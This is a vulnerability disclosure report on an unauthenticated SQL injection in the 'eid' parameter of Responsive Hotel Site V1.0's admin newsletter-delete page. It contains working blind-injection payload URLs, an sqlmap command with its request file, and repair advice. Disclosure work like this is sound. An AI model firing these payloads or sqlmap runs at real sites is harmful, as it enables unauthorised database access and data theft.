# Responsive Hotel Site V1.0 /admin/newsletterdel.php SQL injection

# NAME OF AFFECTED PRODUCT(S)

- Responsive Hotel Site

## Vendor Homepage

- [Responsive Hotel Site Using PHP With Source Code - Source Code & Projects](https://code-projects.org/responsive-hotel-site-using-php-source-code/)

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- AmengSec

## VERSION(S)

- V1.0

## Software Link

- [Responsive Hotel Site Using PHP With Source Code - Source Code & Projects](https://code-projects.org/responsive-hotel-site-using-php-source-code/)

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was found in the '/admin/newsletterdel.php' file of the 'Responsive Hotel Site' project. The reason for this issue is that attackers inject malicious code from the parameter "eid" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of "Responsive Hotel Site", discovered a critical SQL injection vulnerability in the "/admin/newsletterdel.php" file. This vulnerability stems from insufficient user input validation of the 'eid' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability

# Vulnerability details and POC

## Vulnerability type:

- time-based blind
- boolean-based blind

## Vulnerability location:

- 'eid' parameter

## Payload:

```
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: http://10.151.169.235:8833/admin/newsletterdel.php?eid=1' AND 9964=(SELECT (CASE WHEN (9964=9964) THEN 9964 ELSE (SELECT 2413 UNION SELECT 6336) END))-- dEPu
    Vector: AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))[GENERIC_SQL_COMMENT]

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: http://10.151.169.235:8833/admin/newsletterdel.php?eid=1' AND 1295=BENCHMARK(5000000,MD5(0x6c487858))-- dBdz
    Vector: AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])
```

![image-20251011191306828](assets/image-20251011191306828.png)

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```
python sqlmap.py -r data.txt --dbs -v 3 --batch --level 5
//data.txt
GET /admin/newsletterdel.php?eid=1* HTTP/1.1
Host: 10.151.169.235:8833
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=cuq6v5v2e97ubeodt33s8k4ot9
Connection: keep-alive
```

# Attack results

![image-20251011191340963](assets/image-20251011191340963.png)

# Suggested repair



1. **Use prepared statements and parameter binding:** Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. **Input validation and filtering:** Strictly validate and filter user input data to ensure it conforms to the expected format.
3. **Minimize database user permissions:** Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. **Regular security audits:** Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.